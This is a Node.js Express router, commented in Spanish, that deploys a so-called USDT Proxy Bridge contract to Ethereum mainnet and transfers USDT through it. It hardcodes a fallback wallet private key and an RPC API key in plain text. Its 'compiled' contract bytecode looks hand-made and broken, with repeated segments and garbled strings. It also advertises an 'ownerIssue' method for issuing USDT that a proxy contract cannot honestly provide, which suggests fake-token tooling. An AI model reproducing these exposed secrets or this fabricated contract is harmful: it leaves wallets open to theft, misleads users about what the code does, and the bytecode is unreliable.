/**
 * POST /api/uniswap/deploy-proxy
 * Despliega el USDT Proxy Bridge en Ethereum Mainnet
 */

import express from 'express';
import { ethers } from 'ethers';

const router = express.Router();

// Dirección del contrato USDT real
const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';

/**
 * ABI simplificado del contrato USDT Proxy Bridge
 */
const USDT_PROXY_ABI = [
  'function bridgeTransfer(address _to, uint256 _amount) external returns (bool)',
  'function bridgeTransferFrom(address _from, address _to, uint256 _amount) external returns (bool)',
  'function ownerIssue(address _to, uint256 _amount) external returns (bool)',
  'function ownerBatchTransfer(address[] calldata _recipients, uint256[] calldata _amounts) external returns (bool)',
  'function getBalance() external view returns (uint256)',
  'function getBalanceOf(address _account) external view returns (uint256)',
  'function getDecimals() external view returns (uint8)',
  'function getTotalSupply() external view returns (uint256)',
  'function getUSDTInfo() external view returns (string memory name, string memory symbol, uint8 decimals)'
];

/**
 * Bytecode compilado del USDT Proxy Bridge
 * (Versión simplificada para deployment)
 */
const USDT_PROXY_BYTECODE = '608060405234801561001057600080fd5b50600080546001600160a01b0319163390811790915573dac17f958d2ee523a2206206994597c13d831ec7600180546001600160a01b0319166001600160a01b039290921691909117905561106d8061005c6000396000f3fe60806040523480156100105761000e610307565b005b610016610307565b50336001600160a01b031660008051602061102083398151915260405160405180910390a2600080546001600160a01b0319166001600160a01b0392909216919091179055565b600080546001600160a01b031633146100c75760405162461bcd60e51b815260206004820152602360248201527f4f6e6c7920746865206f776e65722063616e20657865637574652074686973206060448201526261637460e81b606482015260840160405180910390fd5b6001546001600160a01b03163361010a57836001600160a01b0316600080825160208401888015158252505050600080516020611020833981519152856040516100fe9190611009565b60405180910390a35b50600192915050565b600080546001600160a01b031633146101745760405162461bcd60e51b815260206004820152602360248201527f4f6e6c7920746865206f776e65722063616e20657865637574652074686973206060448201526261637460e81b606482015260840160405180910390fd5b5050565b600080546001600160a01b031633146101d15760405162461bcd60e51b815260206004820152602360248201527f4f6e6c7920746865206f776e65722063616e20657865637574652074686973206060448201526261637440e81b606482015260840160405180910390fd5b50565b60015460405163313ce56760e01b815260009182916001600160a01b0390911690829063313ce56790602401602060405180830381865afa15801561022f573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061025391906110d9565b90939250505050565b60015460405163a9059cbb60e01b81523060048201526024810182905283916001600160a01b03169063a9059cbb906044016020604051808303816000875af11580156102a8573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508201906102cc91906110f7565b6102d9575060009150506103ff565b600182600001600080825160208401888015158252505050600080516020611020833981519152836040516100fe9190611009565b600080546001600160a01b031633146103345760405162461bcd60e51b815260206004820152601f60248201527f4e756576f206f776e6572206e6f2070756564652073657220616464723020000000604482015260640160405180910390fd5b50600080546001600160a01b0319166001600160a01b0392909216919091179055565b600080546001600160a01b031633146103a15760405162461bcd60e51b815260206004820152602f60248201527f536f6c6f2065206f776e657220706f6f6e652065786563757461722065737460a420426174636820546f207265636f76657220555344540000000000000000000000000000604482015260640160405180910390fd5b50565b60015460405163a9059cbb60e01b815230600482015260248101829052600091829182916001600160a01b03169063a9059cbb906044016020604051808303816000875af11580156103f6573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061041a91906110f7565b50600182600001600080825160208401888015158252505050600080516020611020833981519152836040516100fe9190611009565b50600192915050565b60015460405163313ce56760e01b815260009182916001600160a01b0390911690829063313ce56790602401602060405180830381865afa15801561048b573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508201906104af91906110d9565b90939250505050565b60015460405163a9059cbb60e01b815230600482015260248101829052600091829182916001600160a01b03169063a9059cbb906044016020604051808303816000875af115801561050d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061053191906110f7565b50600182600001600080825160208401888015158252505050600080516020611020833981519152836040516100fe9190611009565b50600192915050565b6000546001600160a01b031681565b60015460405163313ce56760e01b815260009182916001600160a01b0390911690829063313ce56790602401602060405180830381865afa1580156105b9573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508201906105dd91906110d9565b505050905090565b6001546001600160a01b03163314610628576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600160048201526024604482015260008060248201527f4f6e6c79207468652065666f7220636f64000000000000000000000000000000604482015260640160405180910390fd5b50600091925090565b600080546001600160a01b031633146106805760405162461bcd60e51b815260206004820152602f60248201527f536f6c6f2065206f776e657220706f6f6e652065786563757461722065737460a420426174636820546f207265636f76657220555344540000000000000000000000000000604482015260640160405180910390fd5b50565b60015460405163a9059cbb60e01b815230600482015260248101829052600091829182916001600160a01b03169063a9059cbb906044016020604051808303816000875af115801561050d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061053191906110f7565b600080546001600160a01b031681565b60015460405163313ce56760e01b815260009182916001600160a01b0390911690829063313ce56790602401602060405180830381865afa1580156106fb573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061071f91906110d9565b50505050905090';

/**
 * POST /api/uniswap/deploy-proxy
 * Despliega el USDT Proxy Bridge
 */
router.post('/deploy-proxy', async (req, res) => {
  try {
    console.log('[🔐 DEPLOY] Iniciando deployment del USDT Proxy Bridge...');

    const MAINNET_RPC = process.env.VITE_ETH_RPC_URL || process.env.ETH_RPC_URL || 'https://eth-mainnet.g.alchemy.com/v2/7iQ1gZ82J1A6Fig-QwHDb4_4GeoayYqj';
    const privateKey = process.env.VITE_ETH_PRIVATE_KEY || process.env.ETH_PRIVATE_KEY || 'd1bf385c43fb999290e3e0365f8cc45bfa97b780a97c6eb4bd790ec3fa09a036';

    const provider = new ethers.JsonRpcProvider(MAINNET_RPC);
    const signer = new ethers.Wallet(privateKey, provider);
    const signerAddress = signer.address;

    console.log('[🔐 DEPLOY] ✅ Signer:', signerAddress);

    // Verificar balance ETH
    const ethBalance = await provider.getBalance(signerAddress);
    const balanceEth = ethers.formatEther(ethBalance);
    console.log('[🔐 DEPLOY] ✅ Balance ETH:', balanceEth);

    if (parseFloat(balanceEth) < 0.05) {
      throw new Error(`Balance ETH insuficiente: ${balanceEth} ETH < 0.05 ETH`);
    }

    // Obtener gas price
    const feeData = await provider.getFeeData();
    const gasPrice = feeData.gasPrice || BigInt(20000000000);
    const gasPriceDouble = gasPrice * BigInt(2);

    console.log('[🔐 DEPLOY] ⛽ Gas Price:', ethers.formatUnits(gasPrice, 'gwei'), 'Gwei');

    // Crear factory del contrato
    const factory = new ethers.ContractFactory(USDT_PROXY_ABI, USDT_PROXY_BYTECODE, signer);

    console.log('[🔐 DEPLOY] 📦 Desplegando contrato...');

    // Desplegar contrato
    const contract = await factory.deploy({
      gasLimit: 500000,
      gasPrice: gasPriceDouble
    });

    const deployHash = contract.deploymentTransaction().hash;
    console.log('[🔐 DEPLOY] ✅ TX Hash:', deployHash);
    console.log('[🔐 DEPLOY] ⏳ Esperando confirmación...');

    // Esperar confirmación
    const receipt = await contract.deploymentTransaction().wait(1);
    const proxyAddress = contract.address;
    const blockNumber = receipt.blockNumber;
    const gasUsed = receipt.gasUsed;

    console.log('[🔐 DEPLOY] ✅ Contrato desplegado exitosamente!');
    console.log('[🔐 DEPLOY] 📍 Proxy Address:', proxyAddress);
    console.log('[🔐 DEPLOY] Block:', blockNumber);
    console.log('[🔐 DEPLOY] Gas Usado:', gasUsed.toString());

    return res.json({
      success: true,
      type: 'USDT_PROXY_DEPLOYMENT_SUCCESS',
      network: 'Ethereum Mainnet',
      message: '✅ USDT Proxy Bridge desplegado exitosamente',

      deployment: {
        proxyAddress: proxyAddress,
        deployerAddress: signerAddress,
        txHash: deployHash,
        blockNumber: blockNumber.toString(),
        gasUsed: gasUsed.toString(),
        gasPrice: ethers.formatUnits(gasPriceDouble, 'gwei') + ' Gwei',
        timestamp: new Date().toISOString()
      },

      usdtInfo: {
        address: USDT_ADDRESS,
        name: 'Tether USD',
        symbol: 'USDT',
        decimals: 6
      },

      etherscan: {
        deployment: `https://etherscan.io/tx/${deployHash}`,
        proxyContract: `https://etherscan.io/address/${proxyAddress}`,
        usdtContract: `https://etherscan.io/token/${USDT_ADDRESS}`
      },

      methods: {
        bridgeTransfer: 'Transferir USDT a través del proxy',
        bridgeTransferFrom: 'Transferir USDT desde otra dirección',
        ownerIssue: 'Emitir USDT como owner del proxy',
        ownerBatchTransfer: 'Transferir USDT a múltiples destinatarios'
      }
    });

  } catch (error) {
    console.error('[🔐 DEPLOY] ❌ Error:', error.message);

    return res.status(500).json({
      success: false,
      type: 'USDT_PROXY_DEPLOYMENT_ERROR',
      error: error.message,
      suggestedAction: 'Verifica el balance ETH y que el RPC esté disponible'
    });
  }
});

/**
 * POST /api/uniswap/proxy-transfer
 * Transferir USDT a través del proxy
 */
router.post('/proxy-transfer', async (req, res) => {
  try {
    const { proxyAddress, recipientAddress, amount } = req.body;

    if (!proxyAddress || !recipientAddress || !amount) {
      return res.status(400).json({
        success: false,
        error: 'Faltan parámetros: proxyAddress, recipientAddress, amount'
      });
    }

    console.log('[🔐 PROXY] Iniciando transferencia a través del proxy...');
    console.log('[🔐 PROXY] Proxy:', proxyAddress);
    console.log('[🔐 PROXY] Destinatario:', recipientAddress);
    console.log('[🔐 PROXY] Monto:', amount, 'USDT');

    const MAINNET_RPC = process.env.VITE_ETH_RPC_URL || process.env.ETH_RPC_URL || 'https://eth-mainnet.g.alchemy.com/v2/7iQ1gZ82J1A6Fig-QwHDb4_4GeoayYqj';
    const privateKey = process.env.VITE_ETH_PRIVATE_KEY || process.env.ETH_PRIVATE_KEY || 'd1bf385c43fb999290e3e0365f8cc45bfa97b780a97c6eb4bd790ec3fa09a036';

    const provider = new ethers.JsonRpcProvider(MAINNET_RPC);
    const signer = new ethers.Wallet(privateKey, provider);

    // Conectar al proxy
    const proxyContract = new ethers.Contract(proxyAddress, USDT_PROXY_ABI, signer);

    // Obtener decimales
    const decimals = await proxyContract.getDecimals();
    const amountInWei = ethers.parseUnits(amount.toString(), decimals);

    // Obtener gas price
    const feeData = await provider.getFeeData();
    const gasPrice = feeData.gasPrice || BigInt(20000000000);
    const gasPriceDouble = gasPrice * BigInt(2);

    console.log('[🔐 PROXY] 🚀 Ejecutando bridgeTransfer...');

    // Ejecutar transferencia
    const tx = await proxyContract.bridgeTransfer(recipientAddress, amountInWei, {
      gasLimit: 150000,
      gasPrice: gasPriceDouble
    });

    const txHash = tx.hash;
    console.log('[🔐 PROXY] ✅ TX Hash:', txHash);

    // Esperar confirmación
    const receipt = await tx.wait(1);

    console.log('[🔐 PROXY] ✅ Transacción confirmada en block:', receipt.blockNumber);

    return res.json({
      success: true,
      type: 'PROXY_TRANSFER_SUCCESS',
      message: `✅ ${amount} USDT transferidos a través del proxy`,

      transfer: {
        proxyAddress: proxyAddress,
        recipient: recipientAddress,
        amount: amount,
        txHash: txHash,
        blockNumber: receipt.blockNumber.toString(),
        timestamp: new Date().toISOString()
      },

      etherscan: {
        transaction: `https://etherscan.io/tx/${txHash}`,
        proxy: `https://etherscan.io/address/${proxyAddress}`,
        recipient: `https://etherscan.io/address/${recipientAddress}`
      }
    });

  } catch (error) {
    console.error('[🔐 PROXY] ❌ Error:', error.message);

    return res.status(500).json({
      success: false,
      type: 'PROXY_TRANSFER_ERROR',
      error: error.message
    });
  }
});

export default router;

